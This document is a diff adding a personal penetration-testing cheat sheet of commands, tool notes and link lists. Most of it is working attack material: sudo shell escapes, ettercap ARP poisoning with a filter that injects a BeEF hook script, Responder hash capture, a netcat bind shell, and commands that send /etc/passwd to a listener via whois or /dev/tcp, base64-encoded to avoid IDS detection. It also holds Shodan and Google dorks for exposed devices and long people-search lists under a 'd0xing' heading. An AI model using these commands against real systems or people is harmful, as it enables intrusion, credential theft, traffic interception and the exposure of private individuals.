+			--detail		detail level (high, med, low)
+			--logfile		specify log file (messages, secure)
+			--archives		search history (messages.2)
+			--range		specify dates (today, yeserday, all)
+			--save		save to output, report to file
+			--mailto		send report to local account
+			--print		print to output to screen or a script
+
+		   logwatch --detail med --logfile secure --archives --range all \
+			--print | grep tharel > tharel-logon-report.txt
+
+Splunk	-Google for log files (log parsing tool)
+		http://www.splunk.com
+			Define queries and Splunk shows the results
+			HTML interface
+			Can accept data from multiple sources
+			Need to know what to look for to be effective
+			Pattern matching for log entries
+			Centralized logging
+			Can generate alerts for multiple systems:
+				Applications (named, Sendmail, etc)
+				Firewall
+				IDS
+
+Swatch - using a modem:
+	watchfor /sid=2001/
+	   mail=noc@fubar.org:tharel@fubar.org,subject=Snort_Alert \
+	   exec chat -f /etc/chatstuff/chatscript1.txt -v -s -T 2501 < /dev/modem > /dev/modem
+
+
+SEC		-Simple Event Coordinator (SEC)
+		 http://www.estpak.ee/%7Eristo/sec/
+
+
+
+
+********************************************************************************************************
+Sites for ethical hacking and testing
+********************************************************************************************************
+    * http://www.owasp.org/index.php/Category:OWASP_WebGoat_Project		->Vulnerable Web App
+    * http://ctf.poly.ede
+    * hackinthebox
+    * http://testasp.acunetix.com/Default.asp
+    * http://test.acunetix.com/
+    * http://testphp.acunetix.com/
+    * http://hackme.ntobjectives.com/
+    * http://www.foundstone.com/us/resources/proddesc/hacmeshipping.htm
+    * http://www.foundstone.com/us/resources/proddesc/hacmecasino.htm
+    * http://www.foundstone.com/us/resources/proddesc/hacmebooks.htm
+    * http://www.foundstone.com/us/resources/proddesc/hacmetravel.htm
+    * http://www.foundstone.com/us/resources/proddesc/hacmebank.htm
+    * http://zero.webappsecurity.com/
+    * http://www.hackertest.net/
+    * http://www.hackthissite.org/
+    * http://www.mavensecurity.com/WebMaven.php
+    * http://ha.ckers.org/challenge/
+    * http://ha.ckers.org/challenge2/
+    * http://demo.testfire.net/
+    * http://scanme.nmap.org/
+    * http://www.hellboundhackers.org/
+    * http://www.overthewire.org/wargames/   					->need to check this
+    * http://roothack.org/
+    * http://heorot.net/
+    * http://www.irongeek.com/i.php						->need to check this
+    * http://www.irongeek.com/i.php?page=security/mutillidae-deliberately-vulnerable-php-owasp-top-10
+    * http://wocares.com/xsstester.php
+    * https://how2hack.net
+    * http://hax.tor.hu/ 
+    * http://de-ice.net/hackerpedia/index.php/De-ICE.net_PenTest_Disks    
+    * http://www.damnvulnerablilinux.org
+    * http://www.bonsai-sec.com/en/research/moth.php
+    * http://www.crackmes.de							->need to check this
+    * http://tuts4you.com							->need to check this
+    * http://sourceforge.net/projects/vicnum/					->Vulnerable Web App 
+    * http://sourceforge.net/projects/dvwa/					->Damn Vuln Web App
+    * http://blog.metasploit.com/2010/05/introducing-metasploitable.html	->Vuln ISO for exploiting
+    * http://google-gruyere.appspot.com/					->Vulnerable Web App
+    * http://code.google.com/p/bodgeit/						->Vulnerable Web App
+    * http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx	->Android Hacking
+
+********************************************************************************************************
+Cool shit I didn't know where else to put
+********************************************************************************************************
+
+get a shell through VIM:
+	:!/bin/bash
+
+	if VIM is in sudoer file you may get root, etc.
+
+
+find / -name *.conf -exec grep pass {} \;
+	finds all files names *.conf and greps them for the word pass
+
+
+Get a shell via awk (if in sudoers)
+	awk 'BEGIN {system("/bin/bash")}'
+
+
+sudo -u <user name>	sudo to that user instead of root
+
+sudo -l		list commands the user can run via sudo
+
+
+
+Elevate permissions via setuid (i.e. how passwd runs as root) bit if cp and chmod are in sudoers
+	write C program elevate.c:
+		int main(void)
+		{
+		system("cat /home/victim/key.txt");
+		}
+
+	compile:
+		gcc -o elevate elevate.c
+
+	cp file so owership moves to new user
+		sudo -u victim cp elevate elevatenew
+
+	set suid on it:
+		sudo -u victim chmod +xs elevatenew
+
+	run elevatenew:
+		./elevatenew
+
+	 
+
+
+
+SSH - for routing ports through a linux box:
+ssh -L 3389:192.168.124.125:3389 root@pt-v2714-us.remotepentest.com
+
+
+ping -R 10.1.1.1	-Record route.  Different than traceroute.  Will work 
+			 where traceroute doesn't up to 8 hops
+
+
+Hexeditor for MAC 0xED
+http://www.suavetech.com/0xed/
+		
+
+Ettercap
+
+For SSL support first install iptables then edit the etter.conf file and make the following changes:
+	ec_uid = 0
+	ec_gid = 0
+	And uncomment the following two lines in the "if you use iptables" section:
+	redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j ...
+	redir_commmand_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port ...
+
+	
+ettercap -Tq -M arp:remote /192.168.1.1/ /192.168.1.3/
+	-Tq 	text mode and quiet mode (no q will print entire packets)
+	-M	session highjacking
+	arp	arp poisoning
+	ip's	poison the arp of the listed ip's
+
+
+ettercap -Tq -M arp:remote /192.168.1.1/ /192.168.1.2-10/
+
+ettercap -Tq -M arp:remote / / / /	-arp poison all machines
+
+ettercap -Tq -M arp:remote /10.0.0.1/ /10.0.0.5-8,11/
+
+Use ettercap to watch somebody elses browsing in your browser:
+Will need the mozilla or seamonkey browser
+#edit the etter.conf file and change:
+#	remote_browser = "mozilla -remote openurl{http://%host%url}"
+#		to
+#	remote_browser = "firefox -remote openurl{http://%host%url}"
+	
+#	cd /usr/bin
+#	ln -s firefox mozilla
+	xhost local:root
+	sudo root and run mozilla
+
+	ettercap -T -q -M arp:remote -i wlan0 /10.10.10.23/ /10.10.10.1/ -P remote_browser
+		-T	text mod
+		-q	quiet mode - Do not print raw packets to terminal but print passwords
+		-M	Start man in the middle mode, arp:remote is the type of poisoning
+		-i	interface to use
+		/10.23/	Victim
+		/10.1/	Gateway
+		-P	-P remote_browser is the plugin to follow the vicim browser	
+
+ettercap -T -P arp_cop
+	-P arp_cop	-run plugin arp_cop - detect if somebody is using ettercap
+	"IP-change"  if you see this it means somebody has highjacked your session
+
+	Start-> Backtrack-> Sniffers-> Ettercap
+		Sniff-> Unified Sniffing-> <select interface>-> Ok
+		Hosts-> Scan for hosts
+		Hosts-> Hosts list
+		Mitm-> Arp poisoning-> Sniff remote connections-> Ok
+		Start-> Start Sniffing
+		View-> Connections
+		View Session Data
+
+	DNS Spoofing  --this is NOT arp poisoning
+		cd /usr/local/share/ettercap
+		echo *.google.com A 192.168.1.1 >> etter.dns
+		ettercap -T -P dns_spoof
+			-P dns_spoof  -run plugin dns_spoof
+
+Ettercap filter to inject the BeEF hook into HTTP traffic
+		    if (ip.proto == TCP && tcp.src == 80) {
+		    replace("</body>", "<script src='http://mysite.com/hook.js'>
+		    </script></body>");
+		    replace("Accept-Encoding: gzip, deflate",
+		    "Accept-Encoding:              ");
+		    }
+
+
+
+
+Responder - This tool is first an LLMNR and NBT-NS responder, it will answer to 
+	*specific* NBT-NS (NetBIOS Name Service) queries based on their name 
+	suffix (see: http://support.microsoft.com/kb/163409). By default, the
+	tool will only answers to File Server Service request, which is for SMB.
+	The concept behind this, is to target our answers, and be stealthier on
+	the network. This also helps to ensure that we don't break legitimate
+	NBT-NS behavior. You can set the -r option to 1 via command line if 
+	you want this tool to answer to the Workstation Service request name
+	suffix.
+	https://github.com/SpiderLabs/Responder
+	Also great with WPAD
+	python /usr/share/responder/responder.py -i 10.1.1.1 
+	python /usr/share/responder/responder.py -i 10.1.1.1 -r 1 -b 1
+		-i <ip>	The ip address to redirect the traffic to.  (usually yours)
+		this runs SQL, HTTP, SMB, DNS and LDAP server
+
+		When an smb request for an unknown name occurs responder will respond 
+		and capture the smb HASH which can then be copied and pasted into a 
+		text file and ran against john the ripper.
+
+
+
+vmsplice - local privelege escelation program for linux boxes.
+
+
+
+Methods for pulling accounts
+	Linux:
+	/etc/passwd
+	finger
+	who
+	w
+	finger @targetIP
+	ypcat passwd
+	ypcat group
+	ldapsearch
+
+	Windows - pulling user lists and/or SIDS can be accomplished:
+	1. pull user lists from Null SMB sessions
+		net use \\targetIP "" /u:""
+	2. User2sid and Sid2user
+		These 2 commands,plus anon above will give you sids:
+		user2sid \\[targetIP] [machine_name]	#Get the SID w/out S-1-
+		for /L %i in (1000,1,1010) do @sid2user \\[trgtIP] [SID-RID] %i
+			replace dashes with spaces
+
+	enum -U [targetIP]  	#list users
+	enum -G [targetIP]	#list groups
+
+
+
+nemesis			-packet crafting tool!
+Engage Packet Builder	-packet crafting tool!
+hping2			-packet crafting tool!
+		hping -S --lsrr 192.168.10.16 192.168.1.9 -p 80 -c1	#loose src routing
+		hping -A 192.168.1.9 -p 80 -c 1 -E junk.txt -d 4800 -f	#fragment attack
+			nmap -n -v -sS -p 80 -P0 192.168.1.9			#not fragment
+			nmap -v -v -sS -p 80 -P0 -f 192.168.1.9			#fragment attack
+		
+		hping3 --rawip 10.10.10.20
+		hping3 --rand-dest 10.10.10.x --interface eth0
+			randomly fills in x with IP's; must specify interface 
+		hping3 --spoof 10.10.10.10 10.10.10.20
+			will us .10 as source address and send packets back to .20
+
+	hping Senario:
+		3 PC's:
+			attacker 	192.168.1.3
+			quiet 	192.168.1.1  (computer that will be used for spoofed ip)
+						must be a windows box that is quiet and not serving 
+						much traffic or ID numbers will be inaccurate
+			victum	192.168.1.2
+
+		From Attacker:
+			In Terminal 1			
+				hping -r 192.168.1.1
+					-r 	realize id field
+			In Terminal 2
+				hping 192.168.1.2 -a 192.168.1.1 -S -p 139
+					-a 	spoof source address
+					-S	set SYN flag
+					-p	port
+					if id=+1  port is closed
+					if id=+2  port is open
+
+
+tcpreplay	-Replay wireshark packet captures on the wire				
+
+tcpflow		-Extract packet payloads and save them to files.  Each session saved
+			 to a unique file name.  Client Sever data save to seperate files
+			tcpflow -r file.cap
+
+tcptrack		-produce general stats on network traffic. Useful when packet 
+			 captures are too much data
+			tcptrack -r 10 -i eth0
+				-r 10		10 seconds worth of data
+
+finger		-use finger to finger cisco devices
+			finger root@192.168.1.1
+
+
+gotomypc - checks in with gotomypc.com every 20 seconds
+
+portknocking.org
+
+ttl 64	Linux
+ttl 128	Windows
+
+chaosreader.pl	-perl command that extracts pictures/images from a pcap capture file
+			perl chaosreader.pl suspect-traffic.cap
+
+foremost	-extracts all file from a pcap capture file and puts then in a 'output' directory
+		 really good program!
+		 http://foremost.sourceforge.net/
+		 	foremost -i suspect-traffic.cap
+
+SSH Keys
+	ssh-keygen to generate a personal key pair
+	ssh-keyinstall to put the public key on the remote server (via netcat)
+		http://www.stearns.org/ssh-keyinstall
+	  Good for automated process.  i.e. backups, rsync, etc
+
+Wireless tools to Generate bogus APs in order to capture credentials:
+	Fakeap 
+	hotspotter
+
+sshow -SSH traffic analysis tool
+
+sshmitm	-ssh monkey in the middle attack
+		sshmitm 192.168.1.3 22
+			ip address of the machine you want to sit in the middle of
+			will show login and password of somebody logging in.
+			SSL Version 1 only
+
+Stegonagraphy
+	steghide.exe embed -cf pic.jpg -ef file2hide.txt -sf nothing2see.jpg
+	steghide extract -sf nothing2see.jpg
+	stegdetect
+	xsteg
+
+whois 192.168.1.1 -h whois.arin.net		-uses arin.net to do the whois 
+
+packetstorm		-searchable archive of all the latest secrutiy	
+			 a quick search of the keywords "apache remote execute"
+			 brings us a list of Apache vulnerabilities that allow
+			 an attacker to remotely execute code on the web server
+			 What gets listed is both advisories as well as links
+			 to exploit code.
+
+netcat
+	nc -v -L -p 5000 -e cmd.exe
+
+	nc -v -n -z -w1 1.1.1.1 20-80
+		-v	run verbosely
+		-n	not resolving names, 	
+		-z	without sending data
+		-w1	wait no more than one second for connection to occur
+		20-80	ports 20-80
+		-L	persistent, don't terminate on exit -works on windows
+
+	NetCat relay:
+	You want to bypass a firewall to get to a port that is denied by it
+	mknod backpipe p	
+	nc -l -p 4444 0<backpipe | nc <ip behind firewall> 22 1>backpipe
+		or
+	nc -l -p 4444 0<backpipe | nc <ip behind firewall> 22 |tee backpipe
+
+	on Mac
+	sudo mkfifo -m a+rwx backpipe
+	sudo nc -l 443 -k 0<backpipe |nc bomgar-test.trustwave.com 443 |tee backpipe
+
+
+
+	When no netcat is available on victim host:
+		run netcat on system you control:
+			nc -l 4444
+
+		run whois on victim machine:
+			whois -h <server i control ip> -p 4444 `cat /etc/passwd`
+			whois -h 10.1.1.1 -p 4444 `cat /etc/passwd |base64` 
+				base64 encode output before sending over the wire to avoid
+				IDS detection, etc.
+
+	Also try bash when netcat is not available on victim:
+		run netcat on system you control:
+			nc -l 4444
+
+		run the following on the victim machine:
+			exec 3<>/dev/tcp/10.1.1.1/4444
+			base64 /etc/passwd >&3
+		
+	Another:
+		On system you control:
+			nc -l 4444
+
+		On the victim:
+			cat < /dev/tcp/10.1.1.1/4444 > /etc/passwd
+
+
+Matahari	Setup up a reverse connection
+	Server Setup (PC Behind Firewall):
+	matahari.ph -c 100.100.1.2 -T normal
+		-c   ipaddress of Internet host
+
+	Client Setup:
+	matahari.ph -s 192.168.1.1
+		-s   server ip address
+
+
+
+Tkined		Does similar to Cheops-ng but it has tools to interface with open ports
+			snmp, etc.
+
+Zenmap		Gui front end for nmap, can sort output
+
+arpspoof	spoofs arp address
+macof		floods a switch possibly causing it to 'fail-open'
+tcpkill		kills an active connection
+tcpnice		slows an active connection
+webspy		sends the URLs that a client is browsing to the attackers machine
+
+
+antisniff	Detects sniffers on the wire
+
+httptunnel
+		hts -F internet.server.com:23 80
+		htc -P proxy.com:80 -F 23 Internet.server.com:80
+
+fpipe		Port redirection
+		fpipe -l 23 -s 25 -r 1111 10.10.10.11
+			-l	listen on port 23
+			-s	use a source port of 25
+			-r	redirect to port 1111 on machine 10.10.10.11
+
+elitewrap	can wrap a perfectly friendly executable with a very dangerous
+		executable.
+
+More security tools:
+http://sectools.org
+
+
+WPAD - netbios name for Autodiscovery of Proxy Servers
+    Setup apache to listen on port 80
+    create file wpad.dat and place it in the apache home directory with the following content:
+        function FindProxyForURL(url, host) {
+            return "PROXY 10.2.52.20:3128";
+        }
+
+    Register your computer as the name "wpad"
+        dhcpcd -h WPAD -i eth0
+
+  Now all computers with "Automatically detect settings" enabled in IE will go to your proxy server.  Also good to use with Responder
+
+
+DD
+	dd if=/dev/hda | nc -v 192.168.1.10 54321
+	dd if=/dev/mem | nc -v 192.168.1.10 54321
+
+	dd if=\\.\PhysicalMemory | nc -v 192.168.1.10 54321  #quit working with Win 2003
+	dd if=\\.C: of=E:\analysis\c_drive.img
+
+	Mounting dd images:
+	   Linux	
+		mount -o loop /path/to/image /mnt/point
+	   Windows
+		http://www.mountimage.com
+	   VMWare
+		http://chitchat.at.infoseek.co.jp/vmware/vdk.html
+
+
+Open Source Vulnerability Database
+	www.osvdb.org
+
+Testing your mail server
+	www.mail-abuse.com/an_sec3rdparty.html
+	spamlinks.net/prevent-secure-relay-test.htm
+	www.abuse.net/relay.html
+	www.dnsgoodies.com
+
+Honeynet Challenges:
+		http://www.honeynet.org/misc/chall.html
+
+damnvulnerable linux - also has a web vulnerable site
+
+
+net rpc		-control Windows Boxes
+    List, Start and Stop windows services, do remote shutdown, dump sids, manage windows registry from a linux box:
+	Install necessary tools:
+	sudo apt-get install samba-common 
+
+	List Services:
+	net rpc service list -I IPADDRESS -U USERNAME%PASSWORD
+
+	Stop Service:
+	net rpc service stop SERVICENAME -I IPADDRESS -U USERNAME%PASSWORD
+
+	Start Service:
+	net rpc service start SERVICENAME -I IPADDRESS -U USERNAME%PASSWORD
+
+	net rpc info		show basic info about a domain 	net rpc join            to join a domain 	net rpc oldjoin         to join a domain created in server manager	net rpc testjoin        tests that a join is valid	net rpc user            to add, delete and list users	net rpc password <username> [<password>] -Uadmin_username%admin_pass	net rpc group           to list groups	net rpc share           to add, delete, list and migrate shares	net rpc printer         to list and migrate printers	net rpc file            to list open files	net rpc changetrustpw   to change the trust account password	net rpc getsid          fetch the domain sid into the local secrets.tdb	net rpc vampire         syncronise an NT PDC's users and groups into the local passdb	net rpc samdump         diplay an NT PDC's users, groups and other data	net rpc trustdom        to create trusting domain's account or establish trust	net rpc abortshutdown   to abort the shutdown of a remote server	net rpc shutdown        to shutdown a remote server	net rpc rights          to manage privileges assigned to SIDs	net rpc registry        to manage registry hives	net rpc service         to start, stop and query services	net rpc audit           to modify global auditing settings	net rpc shell           to open an interactive shell for remote server/account management
+
+
+
+SAMBA
+##To list all the domain current machine can talk to
+$ wbinfo --all-domains 
+
+##To get the DC for a particular Domain
+$ wbinfo --getdcname=<DOMAINNAME>
+MACHINE001
+
+##List of all users in domain in /etc/passwd style
+$ getent passwd > /tmp/users
+$ wbinfo -u
+
+##Same for groups
+$ getent group
+$ wbinfo -g
+
+##To get info about a user on a DC (-P use the configured password on this machine)
+$ net user info spider -P -S <DC_HOST>
+<List of groups the user belongs to>
+
+##To add a user to the domain
+$ net user add <user> <pass> -P –S <DC_HOST>
+
+##Get the current authorised user
+$ net getauthuser
+
+##if this works, you might want to check the secrets.tdb file 
+$ strings /etc/samba/secrets.tdb | grep USER 
+$ tdbdump /etc/samba/secrets.tdb
+
+
+
+
+
+
+
+Google
+	Directives:
+		site:www.sans.org
+		inurl:phpinfo
+		inurl:awstats
+		intitle:"Admin Login"
+		link:sans.org
+		ext:xls
+		"-" omits pages or paaes with specific strings from results
+			site:sans.org -site:www.sans.org
+		"+" forces Google to include ignored words like "the and or"
+			jager +and abby
+		link:ecollege.com		shows sites that link to ecollege.com 
+		related:ecollege.com		shows sites 'similar' to ecollege.com
+		intitle:ecollege.com		shows pages whose title matches
+		intitle:index.of passwd		shows /etc/passwd files . means any 
+		inurl:viewtopic.php		shows pages whose URL matches search
+		allintext:joe dan ron		show pages that include all 3
+		allintitle:joe dan ron		all search terms in title
+		allinurl:			all search terms in url
+		filetype:ppt			search for specific type of file
+		ext:ppt				search for specific type of file
+	
+		windows * buffer overflow
+		.				wild card for single character
+		-				remove results from search
+		a OR b				find a or b #case sensitive
+
+
+		Google Groups
+		author:kevin@yahoo.com
+		insubject:"Problems with my code"
+
+		google perform a search "site:sans.org -www.sans.org" will show other google
+		sites that are not www
+
+	google	site:ecollege.com careers
+		site:ecollege.com jobs
+		site:ecollege.com openings
+		This will tell you what jobs/skill sets the company is looking for.  If they
+		are looking for PHP developer they are most likely running PHP code that 
+		could be exploited
+
+
+	Automating Google searches - SensePost released Aura (spud) - bundled with wikto 
+
+	Google Alerts
+		site:sans.org "Index of" "last modified"
+		site:sans.org +passwd
+		ecollege nessus
+		ecollege case study
+
+	google.com/codesearch
+
+	Wikto for Windows - Google Hacking Database queries
+
+	gnucitizen - online google hacking database 
+
+
+Backtrack 4 cheat sheet - http://www.corelan.be:8800/index.php/2009/07/04/backtrack-4-cheat-sheet/
+
+
+
+Backtrack 3 on USB key:
+	To install BackTrack to a USB keychain, ensure you have a keychain with at 
+	least 1GB of space available. Insert the USB keychain device into an existing 
+	Linux system.
+
+	Mount the bt3final_usb.iso which can be found on the Web site?s download page;
+	the version you want to download is the USB Version (Extended). Use:
+
+		# mount -o loop -t iso9660 bt3final_usb.iso /mnt/cdrom
+
+	Next, format the USB device you plan to use. Insert the device and then umount 
+	it; it most likely will get auto-mounted. Make note first of what the device 
+	name was (i.e. /dev/sdd).
+
+	To format the partition as a FAT16 filesystem use:
+
+		# mkfs.msdos /dev/sdd1
+
+	Now mount the USB keychain:
+
+		# mount /dev/sdd1 /mnt/usb
+
+	Next, copy the contents of the ISO to the USB device; if you mounted it to 
+	/mnt/usb, use:
+
+		# cp -av /mnt/cdrom/* /mnt/usb/
+
+	When this is done, move to the USB image on the command-line and execute the 
+	bootinst.sh script in the boot/ directory:
+
+		# cd /mnt/usb/boot
+		# ./bootinst.sh
+
+	These commands must be run in the boot/ directory on the USB keychain device! 
+	If not, they can possibly overwrite the MBR on the host computer so please be 
+	sure you are executing these scripts in the boot/ directory of the USB keychain.
+
+
+Backtrack 3 in Parallels or possibly other VM's
+  http://backtrack.offensive-security.com/index.php/Howto:ParallelsInstall
+  Create partitions
+	bt ~ # fdisk /dev/hda
+		/dev/hda1 	100M	/boot
+		/dev/hda2	5G	swap
+		/dev/hda3	10G	/
+		
+  Format partitions
+	bt ~ # mkfs.ext3 /dev/hda1
+	bt ~ # mkfs.ext3 /dev/hda3
+	bt ~ # mkswap /dev/hda2
+	bt ~ # swapon /dev/hda2
+
+  Copy over files
+
+	bt ~ # mkdir /mnt/backtrack
+	bt ~ # mount /dev/hda3 /mnt/backtrack/
+	bt ~ # mkdir /mnt/backtrack/boot/
+	bt ~ # mount /dev/hda1 /mnt/backtrack/boot/
+	bt ~ # cp --preserve -R /{bin,dev,home,pentest,root,usr,etc,lib,opt,sbin,var} /mnt/backtrack/
+	bt ~ # mkdir /mnt/backtrack/{mnt,proc,sys,tmp}
+	bt ~ # mount --bind /dev/ /mnt/backtrack/dev/
+	bt ~ # mount -t proc proc /mnt/backtrack/proc/
+	bt ~ # cp /boot/vmlinuz /mnt/backtrack/boot/
+	bt ~ # cp /boot/splash.initrd /mnt/backtrack/boot/
+
+  lilo
+
+	bt ~ # chroot /mnt/backtrack/ /bin/bash
+	bt ~ # vi /etc/lilo.conf 
+		lba32
+		boot = /dev/hda
+		prompt
+		timeout = 60
+		change-rules
+		reset
+		vga = 791
+		image = /boot/vmlinuz
+		root = /dev/hda3
+		label = BackTrack
+		read-only
+	bt ~ # lilo -v
+	bt / ~ exit
+
+  Finish
+	Reboot into new build
+	$ /etc/init.d/networking start
+	$ gpg --keyserver keyserver.ubuntu.com --recv f77b1ca9
+	$ gpg --export --armor f77b1ca9 | apt-key add -
+
+
+********************************************************************************************************
+Bad Ass Links - 
+********************************************************************************************************
+
+Site to practice Pen Testing (6/6/2019):
+pwnable.kr
+pwnable.tw
+ctflearn.com
+root-me.org
+hackthebox.eu
+hacking-lab.com
+microcorruption.com
+crackmes.one
+ctflearn.com
+
+
+
+PenTesting Blogs Worth It:
+
+    http://carnal0wnage.blogspot.com/
+    http://www.mcgrewsecurity.com/
+    http://www.gnucitizen.org/blog/
+    http://www.darknet.org.uk/
+    http://spylogic.net/
+    http://taosecurity.blogspot.com/
+    http://www.room362.com/
+    http://blog.sipvicious.org/
+    http://blog.portswigger.net/
+    http://pentestmonkey.net/blog/
+    http://jeremiahgrossman.blogspot.com/
+    http://i8jesus.com/
+    http://blog.c22.cc/
+    http://www.skullsecurity.org/blog/
+    http://blog.metasploit.com/
+    http://www.darkoperator.com/
+    http://blog.skeptikal.org/
+    http://preachsecurity.blogspot.com/
+    http://www.tssci-security.com/
+    http://www.gdssecurity.com/l/b/
+    http://websec.wordpress.com/
+    http://bernardodamele.blogspot.com/
+    http://laramies.blogspot.com/
+    http://www.spylogic.net/
+    http://blog.andlabs.org/
+    http://xs-sniper.com/blog/
+    http://www.commonexploits.com/
+    http://www.sensepost.com/blog/
+    http://wepma.blogspot.com/
+    http://exploit.co.il/
+    http://securityreliks.wordpress.com/
+    http://www.madirish.net/index.html
+    http://sirdarckcat.blogspot.com/
+    http://reusablesec.blogspot.com/
+    http://myne-us.blogspot.com/
+    http://www.notsosecure.com/
+    http://blog.spiderlabs.com/
+    http://www.corelan.be/
+    http://www.digininja.org/
+    http://www.pauldotcom.com/
+    http://www.attackvector.org/
+    http://deviating.net/
+    http://www.alphaonelabs.com/
+    http://www.smashingpasswords.com/
+    http://wirewatcher.wordpress.com/
+    http://gynvael.coldwind.pl/
+    http://www.nullthreat.net/
+    http://www.question-defense.com/
+    http://archangelamael.blogspot.com/
+    http://memset.wordpress.com/
+    http://sickness.tor.hu/
+    http://punter-infosec.com/
+    http://www.securityninja.co.uk/
+    http://securityandrisk.blogspot.com/
+    http://esploit.blogspot.com/
+    http://www.pentestit.com/ 
+
+    Forums:
+
+    Created for forums that will help in both tool usage, syntax, attack techniques, and collection of scripts and tools. Needs some help. I don't really frequent too many underground forums but i actually find nice one-off scripts and info i can roll into my own code in these places. Would like to add more. 
+
+    http://sla.ckers.org/forum/index.php
+    http://www.ethicalhacker.net/
+    http://www.backtrack-linux.org/forums/
+    http://www.elitehackers.info/forums/
+    http://www.hackthissite.org/forums/index.php
+    http://securityoverride.com/forum/index.php
+    http://www.iexploit.org/
+    http://bright-shadows.net/
+    http://www.governmentsecurity.org/forum/
+    http://forum.intern0t.net/ 
+
+    Magazines:
+
+    http://www.net-security.org/insecuremag.php
+    http://hakin9.org/ 
+
+    Video:
+
+    http://www.hackernews.com/
+    http://www.securitytube.net/
+    http://www.irongeek.com/i.php?page=videos/aide-winter-2011
+    http://avondale.good.net/dl/bd/
+    http://achtbaan.nikhef.nl/27c3-stream/releases/mkv/
+    http://www.youtube.com/user/ChRiStIaAn008
+    http://www.youtube.com/user/HackingCons 
+
+Methodologies:
+
+    http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
+    http://www.pentest-standard.org/index.php/Main_Page
+    http://projects.webappsec.org/w/page/13246978/Threat-Classification
+    http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+    http://www.social-engineer.org/ 
+
+OSINT
+
+    Presentations:
+
+    http://www.spylogic.net/2009/10/enterprise-open-source-intelligence-gathering-part-1-social-networks/
+    http://www.spylogic.net/2009/10/enterprise-open-source-intelligence-gathering-%E2%80%93-part-2-blogs-message-boards-and-metadata/
+    http://www.spylogic.net/2009/10/enterprise-open-source-intelligence-gathering-part-3-monitoring/
+    http://www.slideshare.net/Laramies/tactical-information-gathering
+    http://www.sans.org/reading_room/whitepapers/privacy/document_metadata_the_silent_killer__32974
+    http://infond.blogspot.com/2010/05/toturial-footprinting.html 
+
+    People and Organizational:
+
+    http://www.spokeo.com/
+    http://www.123people.com/
+    http://www.xing.com/
+    http://www.zoominfo.com/search
+    http://pipl.com/
+    http://www.zabasearch.com/
+    http://www.searchbug.com/default.aspx
+    http://theultimates.com/
+    http://skipease.com/
+    http://addictomatic.com/
+    http://socialmention.com/
+    http://entitycube.research.microsoft.com/
+    http://www.yasni.com/
+    http://tweepz.com/
+    http://tweepsearch.com/
+    http://www.glassdoor.com/index.htm
+    http://www.jigsaw.com/
+    http://searchwww.sec.gov/EDGARFSClient/jsp/EDGAR_MainAccess.jsp
+    http://www.tineye.com/
+    http://www.peekyou.com/
+    http://picfog.com/
+    http://twapperkeeper.com/index.php 
+    http://pastehtml.com/ view/b1026x5qu.html (remove space)
+    http://www.pipl.com/
+    http://www.ipeople.com/
+    https://www.facebook.com/directory/people/
+    http://www.whitepages.com/
+    http://www.yasni.com/
+    http://www.skipease.com/
+    http://www.peekyou.com/
+    http://www.soople.com/
+    http://www.zaba.com/
+    http://www.zabasearch.com/
+    http://www.Abika.com/
+    http://www.freeality.com/
+    http://www.radaris.com/
+    http://www.fonefinder.net/
+    http://wink.com/
+    http://spock.com/
+    http://socialmention.com/
+    http://www.whostalkin.com/
+    http://www.oneriot.com/
+    http://www.kosmix.com/
+    http://www.yacktrack.com/
+    http://www.keotag.com/
+    http://www.twoogel.com/
+    http://www.knowem.com/
+    http://www.samepoint.com/
+    http://yahoo.intelius.com/
+    http://www.findermind.com/free-people-search-engines/
+    http://www.peekyou.com/
+    http://aad.archives.gov/aad/series-list.jsp?cat=GS29
+    http://www.192.com/
+    http://www.freecellphonedirectorylookup.com/
+    http://pastehtml.com/ view/bh59gkh7b.html# (remove space)
+    http://www.archive.org/web/web.php
+    http://www.numberway.com/phone-numbers/3/
+    https://www.vinelink.com/vinelink/initMap.do
+    http://www.jailbase.com/en/sources/fl-lcso/
+    http://publicrecords.onlinesearches.com/
+    http://www.thepublicrecords.com/
+    http://www.soople.com/
+    http://www.whitepages.com/
+
+    Alternative Twitter search engines:
+    
+    http://twopcharts.com/
+    http://www.twinitor.com/
+    http://snapbird.org/
+
+
+    d0xing:
+    
+    http://www.intelius.com/
+    http://www.spokeo.com/
+    http://pastehtml.com/ view/b1026x5qu.html (remove space)
+    http://www.pipl.com/
+    http://www.ipeople.com/
+    https://www.facebook.com/directory/people/
+    http://www.whitepages.com/
+    http://www.phonebooks.com/
+    http://www.yasni.com/
+    http://www.skipease.com/
+    http://www.peekyou.com/
+    http://www.soople.com/
+    http://www.zaba.com/
+    http://www.zabasearch.com/
+    http://www.Abika.com/
+    http://www.freeality.com/
+    http://www.radaris.com/
+    http://www.fonefinder.net/
+    http://yahoo.intelius.com/
+    http://www.findermind.com/free-people-search-engines/
+    http://www.peekyou.com/
+    http://aad.archives.gov/aad/series-list.jsp?cat=GS29
+    http://www.192.com/
+    http://www.freecellphonedirectorylookup.com/
+    http://pastehtml.com/ view/bh59gkh7b.html# (remove space)
+    http://www.archive.org/web/web.php
+    http://www.numberway.com/phone-numbers/3/
+    https://www.vinelink.com/vinelink/initMap.do
+    http://www.jailbase.com/en/sources/fl-lcso/
+    http://publicrecords.onlinesearches.com/
+
+    
+    Infrastructure:
+
+    http://uptime.netcraft.com/
+    http://www.serversniff.net/
+    http://www.domaintools.com/
+    http://centralops.net/co/
+    http://hackerfantastic.com/
+    http://whois.webhosting.info/
+    https://www.ssllabs.com/ssldb/analyze.html
+    http://www.clez.net/
+    http://www.my-ip-neighbors.com/
+    http://www.shodanhq.com/	
+		Microsoft IIS os:"windows nt"	
+		cisco-ios last-modified
+		ipads
+		anonymous access granted net:159.182.0.0/16
+		d-link internet camera
+		routers with default password
+		default password
+		hack
+		webcam	
+		printer
+		laserjet
+		mysql
+		mssql
+		security
+		authentication
+		admin administrator root
+		
+    http://www.exploit-db.com/google-dorks/
+    http://www.hackersforcharity.org/ghdb/ 
+    http://punkspider.hyperiongray.com/		-> search engine for SQLi and XSS vulnerable sites
+    http://centralops.net/co/
+    http://www.robtex.com/
+    http://www.netcraft.com/
+    http://betterwhois.com/
+    http://website-tools.net/google-keyword/site/find
+    http://subnetscanner.onlinetoolkit.org/
+    http://www.scroogle.com/
+
+Exploits and Advisories:
+
+    http://www.exploit-db.com/
+    http://www.cvedetails.com/
+    http://www.milw0rm.com/ (Down permanently)
